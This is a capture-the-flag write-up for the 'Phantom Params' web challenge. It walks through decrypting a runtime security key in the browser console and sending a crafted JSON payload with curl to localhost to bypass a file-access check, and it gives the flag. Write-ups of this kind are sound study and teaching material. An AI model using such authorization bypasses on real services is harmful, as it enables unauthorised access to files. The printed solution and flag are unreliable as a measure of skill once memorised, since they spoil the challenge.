# Phantom Params - CTF Write-up

## Challenge Description
A secure file sharing platform where only authenticated users can access files. While some files are public, flag.txt requires bypassing a security verification system that combines object merging with dynamic runtime verification.


## Initial Analysis

### 1. Application Flow
- Users must register and login
- Public files (welcome.txt, about.txt) are accessible to all authenticated users
- flag.txt requires passing a security verification
- Limited to 100 requests per 15 minutes

### 2. Source Code Analysis
Looking at the SecurityVerifier class:

```javascript
class SecurityVerifier {
    #ref;
    hiddenKey;
    verifyFn;

    constructor({ hiddenKey }) {
        this.#ref = Object.freeze({
            state: false
        });
        
        this.hiddenKey = hiddenKey || 'ref_' + Math.random().toString(36).substr(2, 5);

        this.verifyFn = (r) => {
            try {
                const p = r[this.hiddenKey];
                if (p && p.auth === true) {
                    return true;
                }
                return false;
            } catch {
                return false;
            }
        };
    }
```

```javascript
let userPrivateKey;
async function handleRegister(event) {
    event.preventDefault();
    const email = document.getElementById('register-email').value;
    const password = document.getElementById('register-password').value;

    try {
        const keyPair = await window.crypto.subtle.generateKey(
            {
                name: "RSA-OAEP",
                modulusLength: 2048,
                publicExponent: new Uint8Array([1, 0, 1]),
                hash: "SHA-256"
            },
            true,
            ["encrypt", "decrypt"]
        );

        const spki = await window.crypto.subtle.exportKey("spki", keyPair.publicKey);
        let binary = '';
        const bytes = new Uint8Array(spki);
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        const base64String = window.btoa(binary);
        const publicKeyPEM = "-----BEGIN PUBLIC KEY-----\n" +
                             base64String.match(/.{1,64}/g).join("\n") +
                             "\n-----END PUBLIC KEY-----";
        userPrivateKey = keyPair.privateKey;
        const response = await fetch('/api/register', {
            method: 'POST',
            credentials: "include",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password, publicKey: publicKeyPEM })
        });

        const data = await response.json();
        if (response.ok) {
            alert('Registration successful! Please login.');
            toggleForms();
            document.getElementById('error-display').textContent = '';
        } else {
            document.getElementById('error-display').textContent = data.error;
        }
    } catch (error) {
        document.getElementById('error-display').textContent = 'An error occurred during registration';
    }
}

async function handleLogin(event) {
    event.preventDefault();
    const email = document.getElementById('login-email').value;
    const password = document.getElementById('login-password').value;

    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });

        const data = await response.json();
        if (response.ok) {
            const encryptedBase64 = data.securityKey;
            const binaryStr = window.atob(encryptedBase64);
            const len = binaryStr.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binaryStr.charCodeAt(i);
            }
            const decryptedBuffer = await window.crypto.subtle.decrypt(
                { name: "RSA-OAEP" },
                userPrivateKey,
                bytes.buffer
            );
            securityKey = decryptedBuffer
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('error-display').textContent = '';
        } else {
            document.getElementById('error-display').textContent = data.error;
        }
    } catch (error) {
        document.getElementById('error-display').textContent = 'An error occurred during login';
    }
}
```

Key observations:
1. Uses dynamic key generation (`ref_` + 5 random chars)
2. Creates verification function at runtime
3. Implements object merging with `resolve()`
4. Rate limited to prevent brute forcing

## Vulnerability Analysis

### 1. Object Merging
The application uses custom object merging:
```javascript
resolve(base, ext) {
    const target = Object.create(null);
    // Deep merge implementation
    // Similar to prototype pollution but with clean objects
}
```

### 2. Dynamic Verification
The security check:
- Generates random key on each instance
- using RSA encryption method, the backend encrypts the security-key and sends it to the frontend
- and the frontend decrypts it

## Exploitation Steps

### 1. Runtime Analysis
Using browser's debugger:
1. Check the source code and find the securitykey
2. Go to the console and paste this:
```javascript
const decodedSecurityKey = new TextDecoder().decode(decryptedBuffer);
console.log("Decrypted Security Key:", decodedSecurityKey);
```
3. get the generated dynamic function name which starts with ref_




### 2. Crafting the Payload
After finding the runtime key:
```javascript
{
    "file_id": "flag.txt",
    "data": {
        "ref_r73nu": {
            "auth": true
        }
    }
}
```

### 4. Getting the Flag
Get the cookie by finding the cookie in the requests header
```bash
curl -X POST http://localhost:3000/api/files \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your_session>" \
  -d '{"file_id":"flag.txt","data":{"ref_abcd1":{"auth":true}}}'
```
or just directly work with the burpsuite which is more easier.

## Tools Used
- Browser Developer Tools (Debugger)
- Burp Suite/Postman for requests
- JavaScript knowledge for runtime analysis

## Flag
`p_ctf{dyn4m1c_0bj3ct_v3r1f13r}`